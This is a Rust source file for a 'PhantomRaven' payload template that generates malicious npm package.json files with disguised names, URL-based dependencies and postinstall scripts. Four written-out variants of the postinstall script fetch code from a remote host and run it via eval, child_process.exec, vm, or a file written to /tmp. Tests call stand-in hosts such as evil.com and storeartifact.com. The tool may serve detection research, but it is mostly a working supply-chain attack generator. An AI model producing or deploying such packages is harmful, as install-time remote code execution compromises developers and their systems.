//! PhantomRaven Payload Template
//!
//! Remote Dynamic Dependencies (RDD) + lifecycle script injection
//! This template generates PhantomRaven-style attacks with polymorphic variations.

use super::{PayloadTemplate, VariableSlot, SlotType, replace_slots};
use std::collections::HashMap;

/// PhantomRaven payload template
///
/// Structure:
/// 1. package.json with URL-based dependencies (RDD)
/// 2. Lifecycle script (postinstall) that fetches and executes remote code
/// 3. Optional JPD author signature
pub struct PhantomRavenTemplate {
    /// Remote URL for the malicious payload
    remote_url: String,
    /// Lifecycle script to execute
    lifecycle_script: String,
    /// Author name (JPD for PhantomRaven signature)
    author_name: String,
}

impl PhantomRavenTemplate {
    /// Create a new PhantomRaven template
    pub fn new(remote_url: &str, lifecycle_script: &str) -> Self {
        Self {
            remote_url: remote_url.to_string(),
            lifecycle_script: lifecycle_script.to_string(),
            author_name: "JPD".to_string(),
        }
    }

    /// Set the author name (default: "JPD")
    pub fn with_author(mut self, author: &str) -> Self {
        self.author_name = author.to_string();
        self
    }
}

impl PayloadTemplate for PhantomRavenTemplate {
    fn name(&self) -> &str {
        "phantom_raven"
    }

    fn description(&self) -> &str {
        "PhantomRaven-style attack: RDD (URL dependencies) + lifecycle script injection"
    }

    fn base_payload(&self) -> String {
        r#"{{
  "name": "{package_name}",
  "version": "{package_version}",
  "description": "{package_description}",
  "author": {{
    "name": "{author_name}"
  }},
  "dependencies": {{
    "{dep_name}": "{remote_url}"
  }},
  "scripts": {{
    "postinstall": "{lifecycle_script}"
  }}
}}"#.to_string()
    }

    fn get_slots(&self) -> Vec<VariableSlot> {
        vec![
            VariableSlot::new(
                "package_name",
                SlotType::VariableName,
                "ui-styles-pkg",
                "Name of the malicious npm package",
            ),
            VariableSlot::new(
                "package_version",
                SlotType::NumericConstant,
                "1.0.0",
                "Package version",
            ),
            VariableSlot::new(
                "package_description",
                SlotType::StringLiteral,
                "UI styles and utilities",
                "Package description for social engineering",
            ),
            VariableSlot::new(
                "author_name",
                SlotType::VariableName,
                "JPD",
                "Author name (JPD = PhantomRaven signature)",
            ),
            VariableSlot::new(
                "dep_name",
                SlotType::VariableName,
                "unused-imports",
                "Name of the URL-based dependency",
            ),
            VariableSlot::new(
                "remote_url",
                SlotType::StringLiteral,
                "",
                "URL to malicious payload (auto-filled from template)",
            ),
            VariableSlot::new(
                "lifecycle_script",
                SlotType::ControlFlow,
                "",
                "Postinstall script to execute (auto-filled from template)",
            ),
        ]
    }

    fn generate(&self, slot_values: &HashMap<String, String>) -> String {
        let mut slots = slot_values.clone();
        
        // Auto-fill remote_url if not provided
        if !slots.contains_key("remote_url") {
            slots.insert("remote_url".to_string(), self.remote_url.clone());
        }

        // Auto-fill lifecycle_script if not provided
        if !slots.contains_key("lifecycle_script") {
            slots.insert("lifecycle_script".to_string(), self.lifecycle_script.clone());
        }

        // Auto-fill author_name if not provided
        if !slots.contains_key("author_name") {
            slots.insert("author_name".to_string(), self.author_name.clone());
        }

        replace_slots(&self.base_payload(), &slots)
    }

    fn decoder_logic(&self) -> String {
        r#"// PhantomRaven does not use decoder logic
// Instead uses direct URL fetch in lifecycle scripts
// Example postinstall script:
// "postinstall": "node -e \"require('https').get('{url}', r => { let d = ''; r.on('data', c => d += c); r.on('end', () => eval(d)) })\""#.to_string()
            .replace("{url}", &self.remote_url)
    }

    fn exec_pattern(&self) -> String {
        self.lifecycle_script.clone()
    }
}

/// Lifecycle script variants for PhantomRaven
pub enum LifecycleVariant {
    /// Direct eval of fetched code
    DirectEval,
    /// Write to file then execute
    WriteThenExec,
    /// Child process execution
    ChildProcess,
    /// VM module execution
    VMExec,
}

impl LifecycleVariant {
    /// Get the lifecycle script for this variant
    pub fn script(&self, url: &str) -> String {
        match self {
            LifecycleVariant::DirectEval => format!(
                r#"node -e "require('https').get('{}', r => {{ let d = ''; r.on('data', c => d += c); r.on('end', () => eval(d)) }})""#,
                url
            ),
            LifecycleVariant::WriteThenExec => format!(
                r#"node -e "require('https').get('{}', r => {{ const fs = require('fs'); let d = ''; r.on('data', c => d += c); r.on('end', () => {{ fs.writeFileSync('/tmp/payload.js', d); require('/tmp/payload.js') }}) }})""#,
                url
            ),
            LifecycleVariant::ChildProcess => format!(
                r#"node -e "require('https').get('{}', r => {{ let d = ''; r.on('data', c => d += c); r.on('end', () => require('child_process').exec(d)) }})""#,
                url
            ),
            LifecycleVariant::VMExec => format!(
                r#"node -e "require('https').get('{}', r => {{ let d = ''; r.on('data', c => d += c); r.on('end', () => require('vm').runInThisContext(d)) }})""#,
                url
            ),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_phantom_raven_template_creation() {
        let template = PhantomRavenTemplate::new(
            "https://storeartifact.com/npm/payload",
            "node -e \"console.log('pwned')\"",
        );
        assert_eq!(template.name(), "phantom_raven");
        assert!(template.description().contains("PhantomRaven"));
    }

    #[test]
    fn test_phantom_raven_base_payload() {
        let template = PhantomRavenTemplate::new(
            "https://evil.com/pkg",
            "node script.js",
        );
        let payload = template.base_payload();
        
        assert!(payload.contains("{package_name}"));
        assert!(payload.contains("{remote_url}"));
        assert!(payload.contains("{lifecycle_script}"));
        assert!(payload.contains("{author_name}"));
    }

    #[test]
    fn test_phantom_raven_generate() {
        let template = PhantomRavenTemplate::new(
            "https://storeartifact.com/npm/payload",
            "node -e \"eval(payload)\"",
        );
        let mut slots = HashMap::new();
        slots.insert("package_name".to_string(), "legit-pkg".to_string());
        slots.insert("dep_name".to_string(), "utils".to_string());

        let payload = template.generate(&slots);
        
        assert!(payload.contains("legit-pkg"));
        assert!(payload.contains("storeartifact.com"));
        assert!(payload.contains("JPD"));
    }

    #[test]
    fn test_phantom_raven_custom_author() {
        let template = PhantomRavenTemplate::new(
            "https://evil.com/pkg",
            "node script.js",
        ).with_author("Custom Author");
        
        let mut slots = HashMap::new();
        let payload = template.generate(&slots);
        
        assert!(payload.contains("Custom Author"));
    }

    #[test]
    fn test_phantom_raven_slots() {
        let template = PhantomRavenTemplate::new(
            "https://evil.com/pkg",
            "node script.js",
        );
        let slots = template.get_slots();
        
        assert!(slots.iter().any(|s| s.id == "package_name"));
        assert!(slots.iter().any(|s| s.id == "remote_url"));
        assert!(slots.iter().any(|s| s.id == "author_name"));
        assert!(slots.iter().any(|s| s.id == "lifecycle_script"));
    }

    #[test]
    fn test_lifecycle_variant_direct_eval() {
        let variant = LifecycleVariant::DirectEval;
        let script = variant.script("https://evil.com/payload");
        
        assert!(script.contains("https://evil.com/payload"));
        assert!(script.contains("eval(d)"));
    }

    #[test]
    fn test_lifecycle_variant_write_then_exec() {
        let variant = LifecycleVariant::WriteThenExec;
        let script = variant.script("https://evil.com/payload");
        
        assert!(script.contains("fs.writeFileSync"));
        assert!(script.contains("/tmp/payload.js"));
    }

    #[test]
    fn test_lifecycle_variant_child_process() {
        let variant = LifecycleVariant::ChildProcess;
        let script = variant.script("https://evil.com/payload");
        
        assert!(script.contains("child_process"));
        assert!(script.contains(".exec(d)"));
    }

    #[test]
    fn test_lifecycle_variant_vm_exec() {
        let variant = LifecycleVariant::VMExec;
        let script = variant.script("https://evil.com/payload");
        
        assert!(script.contains("require('vm')"));
        assert!(script.contains("runInThisContext(d)"));
    }
}
